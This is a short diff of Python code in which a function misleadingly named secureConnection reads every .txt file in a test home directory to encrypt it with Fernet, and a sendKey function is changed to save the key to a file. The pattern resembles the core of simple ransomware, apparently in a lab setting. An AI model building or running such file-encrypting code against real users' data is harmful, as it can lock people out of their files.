@@ -35,7 +35,6 @@ def secureConnection():
     for file in os.listdir(os.path.expanduser('/home/test/')):
         if file.endswith(".txt"):
             filePath = os.path.join("/home/test/", file)
-            print(filePath)
             f = Fernet(key)
             with open(filePath, "rb") as fileContents:
                 data = fileContents.read()
@@ -45,6 +44,11 @@ def secureConnection():
 
 
 def sendKey(key):
+    try:
+        with open("key.key", "wb") as keyFile:
+            keyFile.write(key)
+    except Exception as e:
+        print(e)
     print(key)
 
 
